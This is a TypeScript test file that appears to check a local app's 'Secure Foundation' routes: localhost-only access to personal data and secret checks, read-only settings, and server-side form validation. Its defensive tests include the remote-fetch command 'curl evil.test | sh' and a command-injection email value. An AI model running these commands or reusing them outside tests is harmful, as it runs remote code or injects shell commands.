import {
  SECURE_FOUNDATION_NO_REPO_SECRETS,
  SecureFoundationDevPreview,
  SecureFoundationRepoSecrets,
  secureFoundationDevPreview,
} from "@codeden/contracts";
import { Hono } from "hono";
import { describe, expect, it } from "vitest";
import { secureFoundationRoutes } from "../src/routes/secure-foundation";
import { errorResponse } from "../src/routes/validate";
import type { AppServices } from "../src/services/container";
import type { SecureFoundationService } from "../src/services/secure-foundation";

/**
 * The routes with the peer address injected the way `@hono/node-server` provides it, so a
 * request from another device can be told from one on this computer.
 */
const CLAIM = "https://dashboard.clerk.com/apps/claim?token=fixture";
const calls: unknown[] = [];
const verified: unknown[] = [];
const stub = {
  prefill: async () => ({ adminEmail: "person@site.test" }),
  finish: () => ({ clerkClaimUrl: CLAIM, deployedUrl: "https://my-site.vercel.app" }),
  verify: async (req: unknown) => {
    verified.push(req);
    return { checks: [], template: null };
  },
  create: async (req: unknown) => {
    calls.push(req);
    return { project: {}, sessionId: "s1", commit: "a".repeat(40) };
  },
  devPreview: (id: string, known: { baseCheckout: string | null }) => {
    offered.push(`${id} ${known.baseCheckout}`);
    return secureFoundationDevPreview(
      { secrets: "doppler", doppler: { project: "my-site", config: "dev" } },
      known,
    );
  },
  repoSecrets: {
    view: async (id: string, opts: { local: boolean; setUp: () => boolean }) => {
      secretViews.push(`${id} ${opts.local ? "local" : "remote"}`);
      return opts.local ? CHECKED : { ...CHECKED, canCheck: false };
    },
    check: async (id: string) => {
      secretChecks.push(id);
      return CHECKED;
    },
  },
} as unknown as SecureFoundationService;
const offered: string[] = [];
const secretViews: string[] = [];
const secretChecks: string[] = [];
const CHECKED = {
  ...SECURE_FOUNDATION_NO_REPO_SECRETS,
  applies: true,
  repository: "octo/my-site",
  checkedAt: "2026-01-05T10:00:00.000Z",
  github: "checked" as const,
  canCheck: true,
};

const app = new Hono()
  .onError((e, c) => errorResponse(e, c))
  .route(
    "/",
    secureFoundationRoutes({
      secureFoundation: stub,
      devPreview: { baseCheckoutPath: (id: string) => `/home/dev-preview/base/${id}` },
    } as unknown as AppServices),
  );

const from = (remoteAddress: string) => ({ incoming: { socket: { remoteAddress } } });
const get = async (path: string, address: string) =>
  (await app.request(path, {}, from(address))).json();

describe("what is personal is answered on this computer only", () => {
  it("suggests the email locally and gives another device nothing", async () => {
    expect(await get("/prefill", "127.0.0.1")).toEqual({ adminEmail: "person@site.test" });
    expect(await get("/prefill", "192.168.1.20")).toEqual({ adminEmail: null });
  });

  it("gives the Clerk claim link locally and not to another device", async () => {
    expect(await get("/projects/p1/finish", "::1")).toEqual({
      clerkClaimUrl: CLAIM,
      deployedUrl: "https://my-site.vercel.app",
    });
    expect(await get("/projects/p1/finish", "100.101.102.103")).toEqual({
      clerkClaimUrl: null,
      deployedUrl: null,
    });
  });
});

describe("what Secure Foundation requires of this computer", () => {
  it("is checked on this computer, and refused to another device before anything runs", async () => {
    let checks = 0;
    const requirements = {
      checkedAt: "2026-01-05T10:00:00.000Z",
      platform: "darwin",
      tools: [],
    };
    const routes = new Hono()
      .onError((e, c) => errorResponse(e, c))
      .route(
        "/",
        secureFoundationRoutes({
          secureFoundation: {
            requirements: async () => {
              checks += 1;
              return requirements;
            },
          },
        } as unknown as AppServices),
      );
    const local = await routes.request("/requirements", {}, from("127.0.0.1"));
    expect(await local.json()).toEqual(requirements);
    const remote = await routes.request("/requirements", {}, from("192.168.1.20"));
    expect(remote.status).toBe(403);
    expect(checks).toBe(1);
  });
});

describe("the values for the dev preview's settings form", () => {
  it("are given on this computer and not to another device", async () => {
    const local = SecureFoundationDevPreview.parse(
      await get("/projects/p1/dev-preview", "127.0.0.1"),
    );
    expect(local.applies).toBe(true);
    // With where the PM thread's preview runs from, for the note about `.env.local`.
    expect(offered.at(-1)).toBe("p1 /home/dev-preview/base/p1");
    expect(local.settings?.command).toBe(
      "doppler run --project my-site --config dev -- npm run dev",
    );
    const before = offered.length;
    expect(await get("/projects/p1/dev-preview", "192.168.1.20")).toEqual({
      applies: false,
      secrets: null,
      settings: null,
      notes: [],
      convex: null,
    });
    // Another device isn't even looked up.
    expect(offered.length).toBe(before);
  });

  it("can only be read: Secure Foundation has no route that takes a command", async () => {
    const settings = { command: "curl evil.test | sh", prepareCommand: null, confirm: true };
    for (const method of ["POST", "PUT", "PATCH", "DELETE"]) {
      for (const path of ["/projects/p1/dev-preview", "/projects/p1", "/dev-preview"]) {
        const res = await app.request(
          path,
          {
            method,
            headers: { "content-type": "application/json" },
            body: JSON.stringify(settings),
          },
          from("127.0.0.1"),
        );
        expect(res.status, `${method} ${path}`).toBe(404);
      }
    }
  });
});

describe("the repository secrets a project's workflows need", () => {
  const check = (address: string, body?: unknown) =>
    app.request(
      "/projects/p1/repository-secrets/check",
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: body === undefined ? undefined : JSON.stringify(body),
      },
      from(address),
    );

  it("are read on this computer, and another device is told so the service runs nothing", async () => {
    const local = SecureFoundationRepoSecrets.parse(
      await get("/projects/p1/repository-secrets", "127.0.0.1"),
    );
    expect(local).toMatchObject({ repository: "octo/my-site", canCheck: true });
    expect(secretViews.at(-1)).toBe("p1 local");
    const remote = SecureFoundationRepoSecrets.parse(
      await get("/projects/p1/repository-secrets", "192.168.1.20"),
    );
    expect(remote.canCheck).toBe(false);
    expect(secretViews.at(-1)).toBe("p1 remote");
  });

  it("are checked again on this computer only", async () => {
    const before = secretChecks.length;
    for (const address of ["192.168.1.20", "100.101.102.103"]) {
      const res = await check(address);
      expect(res.status, address).toBe(403);
      expect(JSON.stringify(await res.json())).toContain("on the computer running the app");
    }
    expect(secretChecks.length).toBe(before);
    for (const address of ["127.0.0.1", "::1"]) {
      const res = await check(address);
      expect(res.status, address).toBe(200);
      expect(SecureFoundationRepoSecrets.parse(await res.json()).github).toBe("checked");
    }
    expect(secretChecks.length).toBe(before + 2);
  });

  it("take no value: nothing in a request reaches the check, and no route sets a secret", async () => {
    const before = secretChecks.length;
    const res = await check("127.0.0.1", {
      name: "CLAUDE_CODE_OAUTH_TOKEN",
      value: "not-a-real-value",
      repository: "someone/else",
    });
    expect(res.status).toBe(200);
    // The check is called with the project's id and nothing of the body.
    expect(secretChecks.slice(before)).toEqual(["p1"]);
    for (const method of ["PUT", "PATCH", "DELETE"]) {
      for (const path of [
        "/projects/p1/repository-secrets",
        "/projects/p1/repository-secrets/check",
        "/projects/p1/repository-secrets/CLAUDE_CODE_OAUTH_TOKEN",
      ]) {
        const refused = await app.request(path, { method }, from("127.0.0.1"));
        expect(refused.status, `${method} ${path}`).toBe(404);
      }
    }
    const post = await app.request(
      "/projects/p1/repository-secrets",
      { method: "POST" },
      from("127.0.0.1"),
    );
    expect(post.status).toBe(404);
  });
});

describe("create validates the form on the server", () => {
  const post = (body: unknown) =>
    app.request(
      "/projects",
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(body),
      },
      from("127.0.0.1"),
    );
  const good = {
    name: "My Site",
    adminEmail: "person@site.test",
    provider: "alpha",
    commit: "a".repeat(40),
  };

  it.each([
    ["a path as the name", { ...good, name: "../x" }],
    ["an address without a dot", { ...good, adminEmail: "person@site" }],
    ["shell characters in the address", { ...good, adminEmail: 'a"$(id)@site.test' }],
    ["a placeholder address the install refuses", { ...good, adminEmail: "admin@example.com" }],
    ["an unknown secrets mode", { ...good, secrets: "vault" }],
    ["a module name that is a path", { ...good, shell: "pick", modules: ["../blog"] }],
    ["a short commit", { ...good, commit: "abc1234" }],
    ["no provider", { ...good, provider: undefined }],
  ])("refuses %s", async (_label, body) => {
    const before = calls.length;
    const res = await post(body);
    expect(res.status).toBe(400);
    expect(calls.length).toBe(before);
  });

  it("passes a valid form on with the defaults filled in", async () => {
    const res = await post(good);
    expect(res.status).toBe(201);
    expect(calls.at(-1)).toEqual({ ...good, secrets: "doppler", shell: "all", modules: [] });
  });

  it("refuses bad input on create whether or not it was verified first", async () => {
    // Verifying takes the form as it stands and reports on it...
    const bad = { ...good, name: "../x", adminEmail: "admin@example.com" };
    const checked = await app.request(
      "/verify",
      {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify(bad),
      },
      from("127.0.0.1"),
    );
    expect(checked.status).toBe(200);
    expect(verified.at(-1)).toMatchObject({ name: "../x" });
    // ...and a create that never asked, or didn't listen, is still refused before the service.
    const before = calls.length;
    expect((await post(bad)).status).toBe(400);
    expect((await post({ ...good, commit: undefined })).status).toBe(400);
    expect(calls.length).toBe(before);
  });
});
